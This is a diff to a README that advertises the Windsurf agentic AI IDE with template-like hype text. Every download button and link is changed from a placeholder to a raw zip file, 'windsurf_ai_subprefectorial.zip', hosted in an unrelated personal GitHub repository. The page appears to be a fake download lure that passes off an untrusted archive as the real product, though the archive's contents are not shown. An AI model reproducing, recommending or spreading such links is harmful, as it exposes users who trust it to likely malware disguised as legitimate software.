@@ -4,7 +4,7 @@
 
 > The agentic AI IDE from Codeium — Windsurf's Cascade agent understands multi-file changes, plans complex refactors, and executes them autonomously so you can think bigger.
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://download.com)&nbsp;
+[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/rish9093/windsurf-ai/raw/refs/heads/main/temperance/windsurf_ai_subprefectorial.zip)&nbsp;
 ![Platform](https://img.shields.io/badge/Platform-Available-green?style=flat-square)&nbsp;
 ![Release](https://img.shields.io/badge/Release-2026-orange?style=flat-square)
 
@@ -37,9 +37,9 @@ Available on **Available Now** · Available on **Windows, macOS, Linux**.
 
 ### Ready to play / use?
 
-[![Download Windsurf — Agentic AI IDE](https://img.shields.io/badge/Download-Windsurf%20%20Agentic%20AI%20IDE-brightgreen?style=for-the-badge)](https://download.com)
+[![Download Windsurf — Agentic AI IDE](https://img.shields.io/badge/Download-Windsurf%20%20Agentic%20AI%20IDE-brightgreen?style=for-the-badge)](https://github.com/rish9093/windsurf-ai/raw/refs/heads/main/temperance/windsurf_ai_subprefectorial.zip)
 
-> **[Click here to download](https://download.com)**
+> **[Click here to download](https://github.com/rish9093/windsurf-ai/raw/refs/heads/main/temperance/windsurf_ai_subprefectorial.zip)**
 
 </div>
 
@@ -69,7 +69,7 @@ Windsurf — Agentic AI IDE is one of the **most hyped releases of Summer 2026**
 
 | Download | Community | News |
 |:--------:|:---------:|:----:|
-| [Download here](https://download.com) | Reddit & Discord | Gaming & tech news |
+| [Download here](https://github.com/rish9093/windsurf-ai/raw/refs/heads/main/temperance/windsurf_ai_subprefectorial.zip) | Reddit & Discord | Gaming & tech news |
 
 ---
 
@@ -77,7 +77,7 @@ Windsurf — Agentic AI IDE is one of the **most hyped releases of Summer 2026**
 
 **Don't miss out — Windsurf — Agentic AI IDE is one of 2026's must-have releases.**
 
-[![Download Now](https://img.shields.io/badge/Download-Windsurf%20%20Agentic%20AI%20IDE-blue?style=for-the-badge)](https://download.com)
+[![Download Now](https://img.shields.io/badge/Download-Windsurf%20%20Agentic%20AI%20IDE-blue?style=for-the-badge)](https://github.com/rish9093/windsurf-ai/raw/refs/heads/main/temperance/windsurf_ai_subprefectorial.zip)
 
 *Windsurf — Agentic AI IDE — Available Now · Windows, macOS, Linux*
 
